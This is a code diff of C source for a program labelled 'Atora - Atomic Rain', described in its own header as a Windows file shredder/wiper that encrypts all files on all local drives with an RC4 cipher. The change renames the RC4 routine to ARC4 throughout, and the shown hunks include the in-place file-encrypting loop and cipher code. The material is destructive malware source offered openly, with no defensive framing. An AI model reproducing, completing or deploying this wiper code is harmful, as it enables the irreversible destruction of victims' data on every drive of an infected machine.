@@ -2,7 +2,7 @@
   Name:             Atora - Atomic Rain.
   Version:          4.91
   Class:            Files shredder for Windows / Wiper.
-  What is he doing: Encrypts all files on all local drives with a cipher RC4
+  What is he doing: Encrypts all files on all local drives with a cipher ARC4
 */
 #include <windows.h>
 #include <stdio.h>
@@ -14,7 +14,7 @@
 #define _BYTE        256
 #define _BUFFER_SIZE 512
 
-void      RC4(unsigned char * data, short int length);
+void      ARC4(unsigned char * data, short int length);
 
 void      WriteTrash(unsigned char * data, short int  length);
 void      FindDir(unsigned char * path, unsigned char * mask);
@@ -145,7 +145,7 @@ void FileEncrypt (unsigned char * filename) {
       while (position < fsize) {
        realread = fread(buffer, size_uc, _BUFFER_SIZE, f);
 
-       RC4(buffer, realread);
+       ARC4(buffer, realread);
 
        fseek(f, position, SEEK_SET);
        fwrite(buffer, size_uc, realread, f);
@@ -179,7 +179,7 @@ void Initialized(unsigned char * key, short int length) {
  vi = bi = _ZERO;
 }
 
-void RC4(unsigned char * data, short int length) {
+void ARC4(unsigned char * data, short int length) {
  register short int i;
   for (i = _ZERO; i < length; i++) {
    vi = (vi + 1) % _BYTE;
